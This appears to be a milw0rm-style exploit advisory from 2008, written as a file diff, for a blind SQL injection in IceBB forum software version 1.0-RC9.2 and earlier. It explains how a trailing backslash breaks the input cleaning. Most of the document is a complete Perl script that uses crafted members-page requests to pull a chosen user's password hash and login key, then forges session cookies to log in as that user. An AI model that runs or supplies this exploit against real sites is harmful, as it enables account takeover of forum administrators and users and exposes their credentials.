@@ -1,0 +1,315 @@
+# Author:	__GiReX__		26/07/08
+# Homepage:	girex.altervista.org
+
+# CMS: 		IceBB <= 1.0-RC9.2
+# Site:		icebb.net
+
+# Bug: 		Blind SQL Injection
+# Exploit:	Session Hijacking PoC
+
+# Works regardless of php.ini settings
+
+
+# Description:
+	IceBB is a powerful, fast, free, and open-source forum solution powered by the free PHP and MySQL. 
+	IceBB scales well, no matter how many users or posts, due to its clean and efficient code. 
+	It can also be fully customized to your needs with full skin and language support. 
+	A powerful admin control center, along with easy-to-use moderation tools, 
+	allow you to easily manage all aspects of your forum.
+
+
+# Exploit Discussion:
+
+IceBB get all incoming data (GET/POST) in /includes/functions.php and store them into $input array (class std_func, function capture_input)
+
+# It "cleans" the string vars with this func:  lines  94-106
+
+94.	function clean_string($v)
+	{
+		if(get_magic_quotes_gpc())
+		{
+			$v = stripslashes($v);  <==   We don't need magic quotes = off  :P
+		}
+		
+		//$v	= htmlentities($v,ENT_QUOTES,'UTF-8');
+		$v	= htmlspecialchars($v,ENT_QUOTES);
+		$v	= preg_replace("/&amp;#0*([0-9]*);?/",'&#\\1;',$v);
+		
+		return $v;
+106.	}
+
+
+So it fixes quotes chars... but what about backslashes?  -->  \  <---
+If i put a backslash at the end of an input that is between 2 quote in a query i can manipulate the query
+
+# Let's see:
+# "SELECT COUNT(*) as total FROM icebb_posts WHERE pauthor_id='{$icebb->input['author']}'"
+
+# Setting author=\  in this query:
+# "SELECT COUNT(*) as total FROM icebb_posts WHERE pauthor_id='\' "
+
+The end quote will be ignored and we get an error..
+
+How can we exploit that?
+In a query with 2 input..
+
+
+# File: /modules/memebers.php  lines 43-78
+
+	$fleh	= $icebb->input;  <==
+	...
+	foreach($fleh as $k => $g)
+	{	
+	 	...
+		$where_clauses[]  = "{$k}='{$g}'";  <==
+		...
+	}
+	...
+
+	$this->qwhere	= implode(' AND ',$where_clauses);
+	$total	= $db->fetch_result("SELECT COUNT(*) as total FROM icebb_users{$this->qwhere}{$qextra}"); <==
+
+In this query there can be more inputs (GET/POST) for example $username and $url.
+
+If we set username=\  the sintax after it will be quoted and became part of the string
+while from the next quote (the one that came before $url) will became SQL. (so the $url content).
+
+# For example:
+# GET /index.php?act=members&username=a\&url=OR+1#
+
+# Became:
+# "SELECT COUNT(*) as total FROM icebb_users WHERE user_group='a\' AND username='OR 1#' AND id!=0 ORDER BY username ASC"
+
+So whith the parameter $username we can manipulate the query...
+
+Unfortunally i could find only a Blind Sql Injection with this trick.. and.. 
+the passwords stored in db are hashed (md5) and salted.
+
+We can try to Hijacking admin/user's session...
+(but we can't access to admin area that needs special login).
+
+# The function autoLogin() in /includes/classes/login_func.php
+# is called if cookies ar set...  line 153-175
+
+153.function autoLogin()
+    {
+		global $icebb,$db,$config,$std;
+	
+		$uid				= $std->eatCookie('uid');
+		$login_key			= $std->eatCookie('login_key');
+	
+		$icebb->hooks->hook('login_autoLogin', $uid, $login_key);
+	
+		$userq				= $db->query("SELECT u.*,g.* FROM icebb_users AS u LEFT JOIN icebb_groups AS g ON u.user_group=g.gid WHERE u.id=".intval($uid)." AND u.login_key='{$login_key}' LIMIT 1");
+		$udata				= $db->fetch_row($userq);
+		
+		if($db->get_num_rows($userq)>=1)
+		{
+			if($std->eatCookie('pass')==$udata['password'])
+			{
+				$sessid		= md5(uniqid(microtime()));
+				$ip			= $icebb->client_ip;
+				$user_agent	= $std->clean_string($_SERVER['HTTP_USER_AGENT']);
+			
+				//$db->query("DELETE FROM icebb_session_data WHERE username='{$udata['username']}' OR ip='{$ip}'",1);
+
+175.			$sessdata	= $this->create_session($udata['username'],$udata['id'],false,true);
+
+
+If admin has cookies enabled we can login and create/edit/delete posts and topics.
+
+###############################  Perl Exploit Start #############################
+
+
+#!/usr/bin/perl
+# IceBB <= 1.0-RC9.2 Blind SQL Injection
+# Admin/User's Session Hijacking PoC
+# Coded by __GiReX__
+
+use LWP::UserAgent;
+ 
+if(not defined $ARGV[1])
+{
+	banner();
+	print "[+] Usage:\tperl  $0  <host>  <path>  [id]\n";
+	print "[+] Example:\tperl  $0  localhost  /icebb/ 1\n";
+	exit;
+}
+
+my $target  =  ($ARGV[0] =~ /^http:\/\//) ?  $ARGV[0].$ARGV[1]:  'http://' . $ARGV[0].$ARGV[1];
+my $id  =  (defined $ARGV[2]) ? $ARGV[2]: 1;  
+
+my $lwp =  new LWP::UserAgent;
+my @cset  =  (48..57, 97..102); 
+
+my ($hash, $key, $user, $prefix) =  (undef, undef, undef, undef);      
+
+banner();
+$user = get_username();
+$prefix =  get_prefix();
+
+print STDOUT "[+] User $id username: $user\n";
+	
+for(my $j = 1; $j <= 32; $j++)
+{  
+    foreach $char(@cset)
+    {	
+		info(chr($char), $hash, "password");
+		$rv = check_char($char, $j, "password");	
+	
+         	if(defined $rv)
+	     	{		
+	         	$hash .= chr($char);
+	         	last;
+	     	}
+    }
+	
+    last if $j > 2 and not defined $hash;
+}	
+
+if(not defined $hash or length($hash) != 32)
+{
+	print STDOUT "\n\n[-] Exploit mistake: probably fixed\n";
+	exit;
+}
+else
+{
+	print STDOUT "\n" x 1; 
+}
+
+for(my $j = 1; $j <= 32; $j++)
+{  
+    foreach $char(@cset)
+    {	
+	  info(chr($char), $key, "loginkey");
+	  $rv = check_char($char, $j, "login_key");	
+	
+          if(defined $rv)
+	  {		
+	       $key .= chr($char);
+	       last;
+	  }
+    }
+	
+    last if $j > 2 and not defined $key;
+}
+
+if(not defined $key or length($key) != 32)
+{
+     print STDOUT "\n\n[-] Exploit mistake: user $id has not a login_key\n";
+     exit;
+}
+
+print "\n\n[+] Attempting to login with user's $id session...\n\n";
+
+$logged = try_login();
+
+if(defined $logged) 
+{
+	print STDOUT "[+] Oh yeah logged in!\n\n";
+	print STDOUT "[+] Try yourself with your browser and these cookies:\n\n";
+	print STDOUT "[+] Cookie: ${prefix}user=${user}; ${prefix}pass=${hash}; \n".
+			 "            ${prefix}uid=${id}; ${prefix}login_key=${key}\n\n";
+}
+else
+{
+	print STDOUT "[-] Attempt failed...\n\n";
+}
+
+print STDOUT "[+] Exploit terminated\n";
+
+
+sub try_login()
+{
+   my $lwp = new LWP::UserAgent;
+      $lwp->default_header('Cookie' => "${prefix}user=${user}; ${prefix}pass=${hash}; ${prefix}uid=${id}; ${prefix}login_key=${key}"); 
+	  
+	  my $res = $lwp->get($target);
+	  
+	  if($res->is_success)
+	  {
+		  if($res->content =~ /User Control Panel/)
+		  {
+			    return 1;
+		  }
+	  }
+	
+  return undef;
+}
+
+sub info
+{
+  my($c, $cur, $str)  =  @_;
+	
+	$cur = '' unless defined $cur;
+	print  STDOUT "[+] User $id ${str}: ${cur}${c}\r";
+	
+  $| = 1; 
+}
+
+sub check_char
+{
+  my ($char, $n, $field)  =  @_ ;
+   
+    my $res = $lwp->get($target."index.php?act=members&username=%5c&url=".
+			        "OR+ASCII(SUBSTRING((SELECT+${field}+FROM+${prefix}users+WHERE+id=${id}),${n},1))=${char}%23");
+		
+	if($res->is_success)
+    	{
+		if($res->content !~ /No members were found that met your selected critera/ and $res->content =~ /<h2>Member list<\/h2>/)
+		{
+			 return $res->is_success; 	 
+		}
+	}
+	
+  return undef;
+}
+
+sub get_prefix()
+{
+  my $rv = "icebb";
+  
+	my $res = $lwp->get($target."index.php?act=members&username=%5c&url=OR+1");
+	
+	if($res->content =~ /as total FROM ([a-z]+)_users WHERE/)
+	{
+		$rv = $1;
+	}
+	
+  return $rv . '_';
+}
+
+sub get_username()
+{  
+  my $rv = undef;
+  my $res = $lwp->get($target."index.php?profile=${id}");
+	
+	if($res->is_success)
+	{
+		if($res->content =~ /<h2>View profile: (.+)<\/h2>/)
+		{
+			$rv = $1;
+		}
+		else
+		{
+			die "[-] Exploit mistake: user ${id} does not exists\n";
+		}
+	}
+	else
+	{
+		die "[-] Exploit mistake: could not connect to $target\n";
+	}
+	
+  return $rv;
+ }
+
+sub banner
+{
+    print "\n";
+    print "[+] IceBB <= 1.0-RC9.2 Blind SQL Injection\n";
+    print "[+] Admin/User's Session Hijacking PoC\n";
+    print "[+] Coded by __GiReX__\n";
+    print "\n\n";
+}
+
+# milw0rm.com [2008-07-26]
